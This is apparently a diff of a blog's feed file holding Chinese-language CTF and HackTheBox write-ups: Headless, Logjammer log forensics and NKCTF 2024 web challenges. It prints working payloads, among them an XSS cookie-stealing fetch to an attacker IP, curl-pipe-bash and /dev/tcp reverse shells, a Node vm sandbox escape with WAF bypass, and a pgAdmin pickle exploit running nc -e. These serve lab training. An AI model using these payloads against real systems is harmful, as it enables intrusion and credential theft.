class="line">app.listen(3000, ()=&gt;&#123;</span><br><span class="line">    console.log(&quot;listen on 3000&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<h1 id="Headless-HackTheBox"><a href="#Headless-HackTheBox" class="headerlink" title="Headless-HackTheBox"></a>Headless-HackTheBox</h1><p>信息搜集</p>
+<p>使用nmap扫描一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.8</span><br></pre></td></tr></table></figure>
 
-<p>本题是考察如何沙箱逃逸实现RCE，waf过滤很多，process被办意味着我们需要用别的手段去得到process对象，中括号被办就不能利用js特性拼接绕过，<code>\</code>被办意味着不能十六进制或者Unicode绕过。</p>
-<h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p><a href="https://ycznkvrmzo.feishu.cn/docx/E92JdQmGxoUwXexnQgpcRaIsn7g">参考LaoGong战队</a></p>
-<p>我们注意到源码中的沙箱定义</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let code = req.body.code;</span><br><span class="line">let sandbox = Object.create(null);</span><br><span class="line">let context = vm.createContext(sandbox);</span><br></pre></td></tr></table></figure>
+<p><img src="/article/Headless-HackTheBox/image-20240331155537558.png"></p>
+<p>可以发现5000端口是开放的，继续扫一下目录</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331163111975.png"></p>
+<p>访问<code>/dashboard</code>发现只有admin才可以，我们注意到cookie值为JWT加密，拿到揭秘网站验证下猜想</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331173230979.png"></p>
+<p>cookie为user用户，那么我们要想访问必须拿到admin的cookie</p>
+<p>访问<code>/support</code>路径存在类似提交留言的功能，应该是存在xss注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-<p>create内为null，并且也没有其他可以引用的对象，这时候想要逃逸我们要用到一个函数中的内置对象的属性arguments.callee.caller，它可以返回函数的调用者。</p>
-<p>而一般情况如果没有执行字符串操作或者利用函数重写，我们可以利用Proxy劫持</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">        get: function()&#123;</span><br><span class="line">            const cc = arguments.callee.caller;</span><br><span class="line">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="line">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
+<p>提交后会发现提示Hacking</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331172458874.png"></p>
+<p>说明思路没错，那么我们可以利用xss注入得到admin的cookie值，payload如下</p>
+<p>（利用fetch函数对我们服务器发送网络请求）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=1 onerror=fetch(&quot;http://10.10.14.34:80/?cookie=&quot;+document.cookie);&gt;</span><br></pre></td></tr></table></figure>
 
-<p>而本题过滤了很多，我们可以用replace函数来绕过对process的检测</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const p = (cc.constructor.constructor(&#x27;return proAcess&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;)))();</span><br><span class="line">const obj=p.mainModule.require(&#x27;child_process&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;));</span><br></pre></td></tr></table></figure>
+<p>经过多次尝试，发现我触发payload的条件必须在<code>User-Agent</code>和<code>message</code>参数都有才行。而国外师傅们不同wp中<code>User-Agent</code>都是payload触发点，但是message参数值的不同。有的是下图这样而有的是<code>message=test;</code></p>
+<p><img src="/article/Headless-HackTheBox/image-20240331172008225.png"></p>
+<p>不过好在是拿到了admin的cookie</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331171946128.png"></p>
+<p>成功访问<code>/dashboard</code>，然后抓包发现data参数存在命令注入</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331174558986.png"></p>
+<p>尝试直接反弹shell发现不行，那么试一下用curl命令</p>
+<ol>
+<li><p>首先在本地创建shell.sh文件，写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.34/1028 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后在本地开启http服务，用来被靶机读取文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后用curl命令去读取我们的shell.sh文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date=;curl 10.10.14.34/shell.sh |bash</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>成功反弹shell</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331175715080.png"></p>
+<p>得到user的flag</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331175800113.png"></p>
+<p>我们尝试用sudo提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
 
-<p>接下来是最为精彩的一步，利用javascript内置函数去返回一个属性描述符（PropertyDescriptor）对象，其中包括value也就是属性值</p>
-<p>最终payload如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">        get: function()&#123;</span><br><span class="line">            const cc = arguments.callee.caller;</span><br><span class="line">            const p = (cc.constructor.constructor(&#x27;return procAess&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;)))();</span><br><span class="line">			const obj = p.mainModule.require(&#x27;child_procAess&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;));</span><br><span class="line">			const ex = Object.getOwnPropertyDescriptor(obj,&#x27;exeAcSync&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;));</span><br><span class="line">			return ex.value(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/5i781963p2.yicp.fun/58265 0&gt;&amp;1&quot;&#x27;).toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
+<p>发现只有<code>/usr/bin/syscheck</code>可用</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331180740517.png"></p>
+<p>我们strings命令查看下得到源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">if [ &quot;$EUID&quot; -ne 0 ]; then</span><br><span class="line">  exit 1</span><br><span class="line">last_modified_time=$(/usr/bin/find /boot -name &#x27;vmlinuz*&#x27; -exec stat -c %Y &#123;&#125; + | /usr/bin/sort -n | /usr/bin/tail -n 1)</span><br><span class="line">formatted_time=$(/usr/bin/date -d &quot;@$last_modified_time&quot; +&quot;%d/%m/%Y %H:%M&quot;)</span><br><span class="line">/usr/bin/echo &quot;Last Kernel Modification Time: $formatted_time&quot;</span><br><span class="line">disk_space=$(/usr/bin/df -h / | /usr/bin/awk &#x27;NR==2 &#123;print $4&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;Available disk space: $disk_space&quot;</span><br><span class="line">load_average=$(/usr/bin/uptime | /usr/bin/awk -F&#x27;load average:&#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;System load average: $load_average&quot;</span><br><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
 
-<p>成功反弹shell，执行<code>/readflag</code>得到flag</p>
-<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325213907880.png"></p>
-<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p><a href="https://c1oudfl0w0.github.io/blog/2024/03/23/NKCTF2024/">参考文章</a></p>
-<p>我们注意下面代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.get(&#x27;/secret&#x27;, function (req, res)&#123;</span><br><span class="line">    if(process.__filename == null) &#123;</span><br><span class="line">        let content = fs.readFileSync(__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        let content = fs.readFileSync(process.__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>重点看下面这段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
 
-<p>如果<code>process.__filename</code>为null则回显源码，我们可以利用原型链污染<code>__filename</code>实现任意文件读取</p>
-<p>本解法利用反射去得到process对象</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">    get: function()&#123;</span><br><span class="line">        const c = arguments.callee.caller</span><br><span class="line">        const p = (c.constructor.constructor(&quot;return Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(&#x27;pro&#x27;)))&quot;))()</span><br><span class="line">        return p.__filename=&quot;/etc/passwd&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>这段代码大概意思就是，if语句先使用pgrep命令检测<code>initdb.sh</code>是否存在，如果不存在则执行该sh文件并丢弃错误输出</p>
+<p>而我们在根目录下并没有找到该sh文件，那么我们可以简单利用一下</p>
+<ol>
+<li><p>首先创建<code>initdb.sh</code>文件，写入提升权限的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;chmod u+s /bin/bash&quot; &gt; initdb.sh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后赋予该sh脚本的执行权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x initdb.sh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>最后sudo执行<code>/usr/bin/syscheck</code>，成功运行sh脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/syscheck</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><img src="/article/Headless-HackTheBox/image-20240331181954932.png"></p>
+<p>运行sh脚本后，用-p参数启动<code>Bash Shell</code>并以特权模式运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -p</span><br></pre></td></tr></table></figure>
 
-<p>然后访问 &#x2F;secret 即可成功读取</p>
-<p>尝试读&#x2F;flag，返回permission denied, open ‘&#x2F;flag’，没权限直接读</p>
-<p>尝试读<code>./hack</code>，注意路径是<code>/app/hack.js</code>，提示<code>shell.js</code>跟进一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">console.log(&quot;shell&quot;); const p = require(&#x27;child_process&#x27;); p.execSync(process.env.command);</span><br></pre></td></tr></table></figure>
-
-<p>最终payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">    get: function()&#123;</span><br><span class="line">        const c = arguments.callee.caller;</span><br><span class="line">        const p = (c.constructor.constructor(&quot;return Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(&#x27;pro&#x27;)))&quot;))();</span><br><span class="line">        p.env.command=&quot;whoami&quot;;</span><br><span class="line">        return p.mainModule.require(&quot;./shell&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-
-<h2 id="attack-tacooooo"><a href="#attack-tacooooo" class="headerlink" title="attack_tacooooo"></a>attack_tacooooo</h2><blockquote>
-<p>pgAdmin CVE-2024-2044</p>
-</blockquote>
-<p>猜测出用户和密码<code>tacooooo@qq.com tacooooo</code></p>
-<p>登陆后发现是pgAdmin 4，搜索一番发现有个很新的漏洞 <a href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">参考文章</a></p>
-<p>poc.py如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def produce_pickle_bytes(platform, cmd):</span><br><span class="line">    b = b&#x27;\x80\x04\x95&#x27;</span><br><span class="line">    b += struct.pack(&#x27;L&#x27;, 22 + len(platform) + len(cmd))</span><br><span class="line">    b += b&#x27;\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(platform)) + platform.encode()</span><br><span class="line">    b += b&#x27;\x94\x8c\x06system\x94\x93\x94&#x27;</span><br><span class="line">    b += b&#x27;\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(cmd)) + cmd.encode()</span><br><span class="line">    b += b&#x27;\x94\x85\x94R\x94.&#x27;</span><br><span class="line">    print(b)</span><br><span class="line">    return b</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    # if len(sys.argv) != 2:</span><br><span class="line">    #     exit(f&quot;usage: &#123;sys.argv[0]&#125; ip:port&quot;)</span><br><span class="line">    # with open(&#x27;nt.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">    #     f.write(produce_pickle_bytes(&#x27;nt&#x27;, f&quot;nc 115.236.153.172 41678 -e /bin/sh&quot;))</span><br><span class="line">    with open(&#x27;posix.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(produce_pickle_bytes(&#x27;posix&#x27;, f&quot;nc 5i781963p2.yicp.fun 58265 -e /bin/sh&quot;))</span><br></pre></td></tr></table></figure>
-
-<p>直接<code>python3 poc.py</code>生成pickle文件（这里kali不行，用了其他师傅的Ubuntu生成的）</p>
-<p>上传成功后，修改cookie为<code>pga4_session=/var/lib/pgadmin/storage/tacooooo_qq.com/posix.pickle!a</code></p>
-<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325235724144.png"></p>
-<p>然后成功反弹shell，在<code>proc/1/environ</code>找到flag</p>
-<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240326001639956.png"></p>
+<p>得到root的flag</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331182210478.png"></p>
 ]]></content>
       <categories>
-        <category>CTF</category>
+        <category>渗透</category>
       </categories>
       <tags>
-        <tag>比赛</tag>
+        <tag>HackTheBox</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Logjammer-HackTheBox</title>
+    <url>/article/Logjammer-HackTheBox.html</url>
+    <content><![CDATA[<p>多个Windows日志文件进行分析，不同的操作被记录在不同的日志并且对应的事件ID很重要，极大方便我们审计日志</p>
+<span id="more"></span>
+
+
+
+<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
+<p>您有机会在一家大型咨询公司担任初级 DFIR 顾问。但是，他们提供了技术评估供您完成。咨询公司 Forela-Security 希望评估您对 Windows 事件日志分析的了解。请分析并报告他们提出的问题。</p>
+</blockquote>
+<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>用户 cyberjunkie 何时成功登录他的计算机？ （世界标准时间）</strong></p>
+<p>题目附件有五个，其中记录Windows登录的日志文件为<code>Security.evtx</code></p>
+<p>我们进行搜索找到cyberjunkie登录的时间，转换一下为<code>27/03/2023 14:37:09</code></p>
+<p><img src="/article/Logjammer-HackTheBox/image-20240422170139500.png"></p>
+<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>用户篡改了系统上的防火墙设置。分析防火墙事件日志以找出添加的防火墙规则的名称？</strong></p>
+<p>我们切换到<code>Windows Firewall-Firewall.evtx</code>日志文件，初步发现事件2004是修改&#x2F;添加规则的</p>
+<p>那么我们在Windows系统下，使用工具EvtxeCmd将其转换成json格式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./EvtxeCmd.exe -f D:\网安工具\取证\附件\Windows-Firewall-Firewall.evtx --json D:\网安工具\取证\附件</span><br></pre></td></tr></table></figure>
+
+<p>然后使用jq命令筛选事件2004和查询PayloadData1字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 20240422094340_EvtxECmd_Output.json | D:\网安工具\取证\jq-1.7.1\jq -c &#x27;select(.EventId == 2004)&#x27; | D:\网安工具\取证\jq-1.7.1\jq -s &#x27;.[0] | [.PayloadData1]&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>得到添加的规则为<code>Metasploit C2 Bypass</code></p>
+<p><img src="/article/Logjammer-HackTheBox/image-20240422194553198.png"></p>
+<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>防火墙规则的方向是什么？</strong></p>
+<p>很明显是出站，英文就是outbound</p>
+<p><img src="/article/Logjammer-HackTheBox/image-20240422195244130.png"></p>
+<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>用户更改了计算机的审计策略。这个更改策略的子类是什么？</strong></p>
+<p>审计策略更改的日志 ID 为 <code>4719</code></p>
+<p>子类为<code>Other Object Access Events</code></p>
+<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>用户“cyberjunkie”创建了一个计划任务。这个任务的名字是什么？</strong></p>
+<blockquote>
+<p>在 Windows 操作系统中，创建计划任务的事件将被记录在 Windows 安全事件日志（Security Event Log）中，并使用事件 ID 4698</p>
+</blockquote>
+<p>直接筛选事件为4698，任务名为<code>HTB-AUTOMATION</code></p>
+<p><img src="/article/Logjammer-HackTheBox/image-20240422200633789.png"></p>
+<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>为任务安排的文件的完整路径是什么？</strong></p>
+<p>在前一题的TaskContent找到路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\CyberJunkie\Desktop\Automation-HTB.ps1</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>该命令的参数是什么？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-A cyberjunkie@hackthebox.eu</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Logjammer-HackTheBox/image-20240422200911551.png"></p>
+<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>系统上运行的防病毒软件识别出威胁并对其执行操作。哪个工具被防病毒软件识别为恶意软件？</strong></p>
+<p>该操作是在<code>Windows Defender</code>日志文件下记录的，并且对应ID为1117、1003、1004、1116等</p>
+<p>所以我们直接锁定到事件1117，发现恶意软件被警告</p>
+<p><img src="/article/Logjammer-HackTheBox/image-20240422201354285.png"></p>
+<h1 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h1><p><strong>引发警报的恶意软件的完整路径是什么？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\CyberJunkie\Downloads\SharpHound-v1.1.0.zip</span><br></pre></td></tr></table></figure>
+
+<h1 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h1><p><strong>防病毒软件采取了什么行动？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Quarantine  //隔离</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Logjammer-HackTheBox/image-20240422201658602.png"></p>
+<h1 id="Task11"><a href="#Task11" class="headerlink" title="Task11"></a>Task11</h1><p><strong>用户使用Powershell执行命令。用户执行了什么命令？</strong></p>
+<blockquote>
+<p>一般情况下，用户在 PowerShell 中执行命令所生成的事件记录在 Windows 安全事件日志（Security Event Log）中的事件 ID 4104。</p>
+</blockquote>
+<p>直接切换到<code>Powershell-Operational</code>日志文件，然后筛选事件4104，找到执行的命令</p>
+<p><img src="/article/Logjammer-HackTheBox/image-20240422202108317.png"></p>
+<h1 id="Task12"><a href="#Task12" class="headerlink" title="Task12"></a>Task12</h1><p><strong>我们怀疑用户删除了一些事件日志。哪个事件日志文件被清除？</strong></p>
+<p>切换到System日志文件，找到被删除的日志文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Microsoft-Windows-Windows Firewall With Advanced Security/Firewall</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Logjammer-HackTheBox/image-20240422202827593.png"></p>
+]]></content>
+      <categories>
+        <category>日志分析</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>Windows</tag>
       </tags>
   </entry>
   <entry>
@@ -1265,6 +1188,83 @@
 <p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124529389.png"></p>
 <p>得到flag</p>
 <p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124558684.png"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>比赛</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NKCTF2024</title>
+    <url>/article/NKCTF2024web%E8%A7%A3%E6%9E%90.html</url>
+    <content><![CDATA[<p>CVE-2019-9059、沙箱逃逸、CVE-2024-2044</p>
+<span id="more"></span>
+
+<h1 id="NKCTF-2024-web解析"><a href="#NKCTF-2024-web解析" class="headerlink" title="[NKCTF 2024]web解析"></a>[NKCTF 2024]web解析</h1><h2 id="my-first-cms"><a href="#my-first-cms" class="headerlink" title="my first cms"></a>my first cms</h2><p>打开题目在最下面发现是CMS Made Simple，版本为2.2.19</p>
+<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093023723.png"></p>
+<p>扫一下发现存在后台登陆界面，直接访问</p>
+<p>用字典爆破下admin的密码为Admin123</p>
+<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093321830.png"></p>
+<p>然后直接登录，去漏洞库搜一下其实存在很多漏洞（重点看最近的）</p>
+<p>找到CMS Made Simple的RCE漏洞（CVE-2019-9059）<a href="https://www.exploit-db.com/exploits/49345">参考文章</a></p>
+<p>步骤如下</p>
+<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093554457.png"></p>
+<p>登陆后按照上图，保存后去执行代码</p>
+<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325092708716.png"></p>
+<p>成功反弹shell，得到flag</p>
+<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325092809851.png"></p>
+<h2 id="全世界最简单的CTF"><a href="#全世界最简单的CTF" class="headerlink" title="全世界最简单的CTF"></a>全世界最简单的CTF</h2><p>扫目录发现存在<code>/secret</code>源码泄露</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const bodyParser = require(&#x27;body-parser&#x27;);</span><br><span class="line">const app = express();</span><br><span class="line">const fs = require(&quot;fs&quot;);</span><br><span class="line">const path = require(&#x27;path&#x27;);</span><br><span class="line">const vm = require(&quot;vm&quot;);</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">.use(bodyParser.json())</span><br><span class="line">.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;))</span><br><span class="line">.use(express.static(path.join(__dirname, &#x27;/public&#x27;)))</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, function (req, res)&#123;</span><br><span class="line">    res.sendFile(__dirname + &#x27;/public/home.html&#x27;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function waf(code) &#123;</span><br><span class="line">    let pattern = /(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g;</span><br><span class="line">    if(code.match(pattern))&#123;</span><br><span class="line">        throw new Error(&quot;what can I say? hacker out!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.post(&#x27;/&#x27;, function (req, res)&#123;</span><br><span class="line">        let code = req.body.code;</span><br><span class="line">        let sandbox = Object.create(null);</span><br><span class="line">        let context = vm.createContext(sandbox);</span><br><span class="line">        try &#123;</span><br><span class="line">            waf(code)</span><br><span class="line">            let result = vm.runInContext(code, context);</span><br><span class="line">            console.log(result);</span><br><span class="line">        &#125; catch (e)&#123;</span><br><span class="line">            console.log(e.message);</span><br><span class="line">            require(&#x27;./hack&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/secret&#x27;, function (req, res)&#123;</span><br><span class="line">    if(process.__filename == null) &#123;</span><br><span class="line">        let content = fs.readFileSync(__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        let content = fs.readFileSync(process.__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.listen(3000, ()=&gt;&#123;</span><br><span class="line">    console.log(&quot;listen on 3000&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>本题是考察如何沙箱逃逸实现RCE，waf过滤很多，process被办意味着我们需要用别的手段去得到process对象，中括号被办就不能利用js特性拼接绕过，<code>\</code>被办意味着不能十六进制或者Unicode绕过。</p>
+<h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p><a href="https://ycznkvrmzo.feishu.cn/docx/E92JdQmGxoUwXexnQgpcRaIsn7g">参考LaoGong战队</a></p>
+<p>我们注意到源码中的沙箱定义</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let code = req.body.code;</span><br><span class="line">let sandbox = Object.create(null);</span><br><span class="line">let context = vm.createContext(sandbox);</span><br></pre></td></tr></table></figure>
+
+<p>create内为null，并且也没有其他可以引用的对象，这时候想要逃逸我们要用到一个函数中的内置对象的属性arguments.callee.caller，它可以返回函数的调用者。</p>
+<p>而一般情况如果没有执行字符串操作或者利用函数重写，我们可以利用Proxy劫持</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">        get: function()&#123;</span><br><span class="line">            const cc = arguments.callee.caller;</span><br><span class="line">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="line">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>而本题过滤了很多，我们可以用replace函数来绕过对process的检测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const p = (cc.constructor.constructor(&#x27;return proAcess&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;)))();</span><br><span class="line">const obj=p.mainModule.require(&#x27;child_process&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p>接下来是最为精彩的一步，利用javascript内置函数去返回一个属性描述符（PropertyDescriptor）对象，其中包括value也就是属性值</p>
+<p>最终payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">        get: function()&#123;</span><br><span class="line">            const cc = arguments.callee.caller;</span><br><span class="line">            const p = (cc.constructor.constructor(&#x27;return procAess&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;)))();</span><br><span class="line">			const obj = p.mainModule.require(&#x27;child_procAess&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;));</span><br><span class="line">			const ex = Object.getOwnPropertyDescriptor(obj,&#x27;exeAcSync&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;));</span><br><span class="line">			return ex.value(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/5i781963p2.yicp.fun/58265 0&gt;&amp;1&quot;&#x27;).toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹shell，执行<code>/readflag</code>得到flag</p>
+<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325213907880.png"></p>
+<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p><a href="https://c1oudfl0w0.github.io/blog/2024/03/23/NKCTF2024/">参考文章</a></p>
+<p>我们注意下面代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.get(&#x27;/secret&#x27;, function (req, res)&#123;</span><br><span class="line">    if(process.__filename == null) &#123;</span><br><span class="line">        let content = fs.readFileSync(__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        let content = fs.readFileSync(process.__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
